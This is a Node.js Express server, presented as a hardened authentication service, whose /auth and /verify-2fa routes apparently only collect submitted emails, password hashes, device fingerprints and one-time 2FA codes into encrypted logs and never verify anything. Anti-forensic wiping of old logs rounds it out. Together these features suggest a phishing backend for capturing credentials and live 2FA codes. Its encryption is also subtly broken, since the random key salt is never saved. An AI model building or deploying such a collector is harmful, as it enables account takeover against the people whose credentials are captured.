require('dotenv').config();
const express = require('express');
const crypto = require('crypto');
const fs = require('fs');
const rateLimit = require('express-rate-limit');
const helmet = require('helmet');
const app = express();

// ======================
// CONFIGURATION
// ======================
const SECURITY_CONFIG = {
  encryption: {
    algorithm: 'aes-256-gcm',
    key: process.env.SECRET_KEY || crypto.randomBytes(32).toString('hex'),
    ivLength: 16,
    saltLength: 64,
    iterations: 100000
  },
  logging: {
    path: './logs/',
    maxFileSizeMB: 10,
    retentionDays: 7
  }
};

// ======================
// MIDDLEWARES
// ======================
app.use(express.json());
app.use(helmet());
app.use(helmet.hidePoweredBy());
app.use(helmet.noSniff());

// Rate limiting
const authLimiter = rateLimit({
  windowMs: 15 * 60 * 1000, // 15 minutes
  max: 5, // 5 tentatives max
  handler: (req, res) => {
    logSuspiciousActivity(req, 'rate_limit_exceeded');
    res.status(429).json({ error: 'Too many requests' });
  }
});

// Security headers
app.use((req, res, next) => {
  res.header('Content-Security-Policy', "default-src 'self'");
  res.header('X-Content-Type-Options', 'nosniff');
  res.header('X-Frame-Options', 'DENY');
  next();
});

// ======================
// FONCTIONS UTILITAIRES
// ======================
function generateKey() {
  return crypto.pbkdf2Sync(
    SECURITY_CONFIG.encryption.key,
    crypto.randomBytes(SECURITY_CONFIG.encryption.saltLength),
    SECURITY_CONFIG.encryption.iterations,
    32,
    'sha512'
  );
}

function encryptData(data) {
  try {
    const iv = crypto.randomBytes(SECURITY_CONFIG.encryption.ivLength);
    const key = generateKey();
    const cipher = crypto.createCipheriv(
      SECURITY_CONFIG.encryption.algorithm,
      key,
      iv
    );
    
    let encrypted = cipher.update(JSON.stringify(data), 'utf8', 'hex');
    encrypted += cipher.final('hex');
    const authTag = cipher.getAuthTag().toString('hex');
    
    return {
      iv: iv.toString('hex'),
      tag: authTag,
      data: encrypted,
      timestamp: new Date().toISOString()
    };
  } catch (err) {
    console.error('Encryption error:', err);
    return null;
  }
}

function logSuspiciousActivity(req, reason) {
  const logEntry = {
    type: 'SECURITY_ALERT',
    reason,
    ip: req.ip,
    timestamp: new Date().toISOString(),
    userAgent: req.headers['user-agent'],
    attemptedAction: req.originalUrl
  };
  
  saveSecureLog(logEntry, 'security.log');
}

function saveSecureLog(data, filename = 'auth.log') {
  try {
    // Vérification de la taille des logs
    const logPath = `${SECURITY_CONFIG.logging.path}${filename}`;
    if (fs.existsSync(logPath)) {
      const stats = fs.statSync(logPath);
      if (stats.size > SECURITY_CONFIG.logging.maxFileSizeMB * 1024 * 1024) {
        rotateLogs(filename);
      }
    }

    const encryptedData = encryptData(data);
    if (encryptedData) {
      fs.appendFileSync(logPath, JSON.stringify(encryptedData) + '\n');
    }
  } catch (err) {
    console.error('Logging error:', err);
  }
}

function rotateLogs(filename) {
  const logPath = `${SECURITY_CONFIG.logging.path}${filename}`;
  const archivePath = `${SECURITY_CONFIG.logging.path}archive/${filename}.${Date.now()}`;
  
  fs.renameSync(logPath, archivePath);
}

// ======================
// ROUTES
// ======================
app.post('/auth', authLimiter, (req, res) => {
  try {
    // Vérification du token de sécurité
    if (req.headers['x-security-token'] !== process.env.API_TOKEN) {
      logSuspiciousActivity(req, 'missing_or_invalid_token');
      return res.status(403).json({ error: 'Access denied' });
    }

    const { email, password, userAgent, fingerprint } = req.body;
    
    if (!email || !password) {
      return res.status(400).json({ error: 'Missing credentials' });
    }

    const logData = {
      timestamp: new Date().toISOString(),
      ip: req.ip,
      email,
      password: crypto.createHash('sha3-256').update(password).digest('hex'),
      userAgent,
      fingerprint,
      status: 'pending_2fa'
    };

    saveSecureLog(logData);
    res.sendStatus(200);
  } catch (err) {
    console.error('Auth error:', err);
    res.status(500).json({ error: 'Internal server error' });
  }
});

app.post('/verify-2fa', authLimiter, (req, res) => {
  try {
    const { email, code, verification } = req.body;
    
    if (!email || !code) {
      return res.status(400).json({ error: 'Missing verification data' });
    }

    const logData = {
      timestamp: new Date().toISOString(),
      ip: req.ip,
      email,
      code,
      verification,
      status: 'completed'
    };

    saveSecureLog(logData);
    res.sendStatus(200);
  } catch (err) {
    console.error('2FA error:', err);
    res.status(500).json({ error: 'Internal server error' });
  }
});

// ======================
// MAINTENANCE DES LOGS
// ======================
setInterval(() => {
  const now = new Date();
  const cutoff = new Date(now - SECURITY_CONFIG.logging.retentionDays * 24 * 60 * 60 * 1000);

  fs.readdir(`${SECURITY_CONFIG.logging.path}archive/`, (err, files) => {
    if (err) return;
    
    files.forEach(file => {
      const filePath = `${SECURITY_CONFIG.logging.path}archive/${file}`;
      const stats = fs.statSync(filePath);
      
      if (stats.mtime < cutoff) {
        secureFileDelete(filePath);
      }
    });
  });
}, 24 * 60 * 60 * 1000); // Nettoyage quotidien

function secureFileDelete(path) {
  try {
    // Écraser le fichier avant suppression
    const data = crypto.randomBytes(1024);
    for (let i = 0; i < 3; i++) {
      fs.writeFileSync(path, data, { flag: 'w' });
    }
    fs.unlinkSync(path);
  } catch (err) {
    console.error('Secure delete error:', err);
  }
}

// ======================
// DÉMARRAGE
// ======================
const PORT = process.env.PORT || 3333;
app.listen(PORT, () => {
  // Vérification des dossiers de logs
  if (!fs.existsSync(SECURITY_CONFIG.logging.path)) {
    fs.mkdirSync(SECURITY_CONFIG.logging.path, { recursive: true });
  }
  if (!fs.existsSync(`${SECURITY_CONFIG.logging.path}archive/`)) {
    fs.mkdirSync(`${SECURITY_CONFIG.logging.path}archive/`);
  }

  console.log(`Server running on port ${PORT}`);
  console.log(`Security mode: ${process.env.NODE_ENV || 'development'}`);
});
